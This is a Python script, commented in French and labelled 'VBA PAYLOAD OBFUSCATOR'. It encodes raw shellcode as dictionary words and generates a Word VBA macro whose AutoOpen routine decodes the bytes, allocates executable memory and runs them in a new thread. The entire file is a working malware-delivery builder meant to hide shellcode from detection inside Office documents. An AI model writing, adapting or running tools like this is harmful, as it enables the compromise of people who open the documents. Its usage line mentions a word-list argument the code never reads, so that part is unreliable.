#!/usr/bin/env python3

import sys
import requests
import random

def main(input_file):
    # 1. Dictionnaire de substitution
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    hex_values = [f'{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))

    # 2. Encodage du shellcode
    encoded_words = []
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            hex_value = f"{byte.hex()}"
            encoded_words.append(word_dict[hex_value])
            byte = f_in.read(1)

    # Split pour éviter dépassement de long. VBA
    encoded_chunks = []
    chunk_size = 100
    for i in range(0, len(encoded_words), chunk_size):
        encoded_chunks.append(' '.join(encoded_words[i:i+chunk_size]))

    # Génération du code VBA
    vba_macro = '''\
' --------- OBFUSCATED PAYLOAD MACRO ---------
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#End If

Sub AutoOpen()
    Dim sc As String
    Dim chun As Variant
    sc = ""
'''

    # Ajoute chaque chunk à la concaténation VBA
    for chunk in encoded_chunks:
        vba_macro += f'    sc = sc & "{chunk} "\n'

    vba_macro += '''
    Dim sc_arr() As String
    Dim bytArr() As Byte
    Dim i As Long

    sc = Trim(sc)
    sc_arr = Split(sc, " ")
    ReDim bytArr(UBound(sc_arr))
    '''

    # Création du dictionnaire pour décodage VBA
    vba_macro += '\n    Dim worddict As Object\n    Set worddict = CreateObject("Scripting.Dictionary")\n'
    for k, v in word_dict.items():
        vba_macro += f'    worddict.Add "{v}", &H{k}\n'

    vba_macro += '''
    For i = 0 To UBound(sc_arr)
        If worddict.Exists(sc_arr(i)) Then
            bytArr(i) = worddict(sc_arr(i))
        Else
            bytArr(i) = 0
        End If
    Next i

    Dim mem As LongPtr
    mem = VirtualAlloc(0, UBound(bytArr) + 1, &H3000, &H40)
    For i = 0 To UBound(bytArr)
        RtlMoveMemory mem + i, VarPtr(bytArr(i)), 1
    Next i

    Dim threadID As LongPtr
    Dim hThread As LongPtr
    hThread = CreateThread(0, 0, mem, 0, 0, threadID)
    WaitForSingleObject hThread, &HFFFFFFFF
End Sub

'''

    print("Macro VBA créée dans 'generated_macro.vba'")
    with open('generated_macro.vba', 'w') as f:
        f.write(vba_macro)

if __name__ == "__main__":
    print("##############################################")
    print("########### VBA PAYLOAD OBFUSCATOR ###########")
    print("##############################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_vba.py <path_to_raw_payload_file> <optional_path_to_wordlist_default_MIT_10K>\n")
        sys.exit(1)
    file_path = sys.argv[1]
    main(file_path)
